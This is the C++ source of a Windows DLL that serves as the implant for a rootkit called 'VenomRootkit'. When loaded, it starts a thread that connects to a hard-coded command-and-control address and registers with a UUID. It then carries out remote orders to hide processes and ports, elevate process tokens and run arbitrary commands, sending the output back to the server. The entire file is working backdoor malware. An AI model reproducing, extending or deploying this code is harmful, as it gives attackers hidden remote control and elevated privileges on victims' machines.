//#define WIN32_LEAN_AND_MEAN
#include "CommunicationHandler.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include "../VenomRootkit/Ioctl.h"
#include "VenomClient.h"
#include "VenomCommands.h"
#include "Utils.h"


extern "C" __declspec(dllexport)
DWORD WINAPI VenomThread(LPVOID lpParam)
{
	VenomCommands::Command recievedCommand = { 0 };
	CommunicationHandler::Communicator cncCommunicator("172.17.20.232", 8888);
	if (cncCommunicator.connectToCnc())
	{
		auto uuid = Utils::generateUUID();
		cncCommunicator.sendDataToCnc(uuid.c_str());

		auto status = STATUS_SUCCESS;

		while (true)
		{
			cncCommunicator.pullCommand(&recievedCommand);

			switch (recievedCommand.commandType)
			{

			case VenomCommands::CommandTypes::HideProcess:
				status = VenomCommands::hideProcess(*(ULONG*)recievedCommand.data);
				if(STATUS_SUCCESS == status) { cncCommunicator.sendDataToCnc("Successfully hidden process\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to hide process\n"); }
				break;

			case VenomCommands::CommandTypes::HidePort:
				status = VenomCommands::hidePort(*(USHORT*)recievedCommand.data);
				if (STATUS_SUCCESS == status) { cncCommunicator.sendDataToCnc("Successfully hidden port\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to hide port\n"); }
				break;

			case VenomCommands::CommandTypes::ElevateToken:
				status = VenomCommands::elevateToken(*(ULONG*)recievedCommand.data);
				if (STATUS_SUCCESS == status) { cncCommunicator.sendDataToCnc("Successfully elevated token\n"); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to elevate token\n"); }
				break;

			case VenomCommands::CommandTypes::ExecuteCommand:
				const char* commandOutput = { 0 };
				status = VenomCommands::executeCommand(recievedCommand.data, commandOutput);
				if (STATUS_SUCCESS == status) { cncCommunicator.sendDataToCnc(commandOutput); }
				else { cncCommunicator.sendDataToCnc("Error: Unable to execute command\n"); }
				break;

			default:
				cncCommunicator.sendDataToCnc("Error: unknown command recieved\n");
				break;
			}

			if(recievedCommand.size > 0)
				free(recievedCommand.data);

			memset(&recievedCommand, 0, sizeof(VenomCommands::Command));
		}
	}
	else
	{
		// Activate the kill switch.
		std::cout << "fail" << std::endl;
	}
	cncCommunicator.disconnectFromCnc();

	return 0;
}

extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, VenomThread, NULL, NULL, NULL);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}